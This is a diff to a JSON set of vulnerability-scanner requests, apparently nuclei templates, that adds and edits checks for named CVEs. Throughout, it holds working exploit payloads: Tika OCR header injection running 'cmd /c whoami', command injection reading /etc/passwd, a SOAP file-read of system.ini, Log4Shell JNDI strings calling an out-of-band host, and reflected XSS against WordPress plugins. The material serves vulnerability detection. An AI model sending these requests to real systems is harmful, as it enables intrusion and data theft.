@@ -6145,11 +6145,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -10285,8 +10285,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10670,9 +10670,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -13333,6 +13333,21 @@
       ]
     },
     {
+      "id": "CVE-2021-25055",
+      "info": {
+        "name": "FeedWordPress < 2022.0123 - Authenticated Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=feedwordpress%2Fsyndication.php&visibility=%22%3E%3Cimg+src%3D1+onerror%3Dalert%28document.domain%29%3E HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-25063",
       "info": {
         "name": "Contact Form 7 Skins <= 2.5.0 - Reflected Cross-Site Scripting (XSS)",
@@ -13358,6 +13373,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https://example.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-25112",
+      "info": {
+        "name": "WHMCS Bridge < 6.4b - Authenticated Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -15506,7 +15536,7 @@
     {
       "id": "CVE-2021-41691",
       "info": {
-        "name": "openSIS Student Information System 8.0 SQl Injection Vulnerability",
+        "name": "OpenSIS Student Information System 8.0 - Authenticated SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -15827,7 +15857,8 @@
       "requests": [
         {
           "raw": [
-            "GET /?x=${jndi:ldap://${hostName}.{{interactsh-url}}/a} HTTP/1.1\nHost: {{Hostname}}\nAccept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}\nAccept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}\nAccept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}\nAccess-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}\nAccess-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}\nAuthentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}\nAuthentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}\nCookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}\nLocation: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}\nOrigin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}\nReferer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}\nUpgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}\nUser-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}\nX-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}\nX-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}\nX-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}\nX-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}\nX-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}\n"
+            "GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}\nAccept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}\nAccept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}\nAccess-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}\nAccess-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}\nAuthentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}\nAuthentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}\nCookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}\nLocation: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}\nOrigin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}\nReferer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}\nUpgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}\nUser-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}\nX-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}\nX-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}\nX-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}\nX-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}\nX-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}\n"
           ]
         }
       ]
@@ -16033,6 +16064,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0148",
+      "info": {
+        "name": "All-in-one Floating Contact Form < 2.0.4 - Authenticated Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=my-sticky-elements-leads&search-contact=xxxx%22%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29+x HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0149",
       "info": {
         "name": "WooCommerce Stored Exporter WordPress Plugin < 2.7.1 - Reflected Cross-Site Scripting",
@@ -16043,6 +16089,21 @@
           "raw": [
             "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
             "GET /wp-admin/admin.php?page=woo_ce&failed=1&message=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0189",
+      "info": {
+        "name": "WP RSS Aggregator < 4.20 - Authenticated Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nid=%3Chtml%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29%3E\n"
           ]
         }
       ]
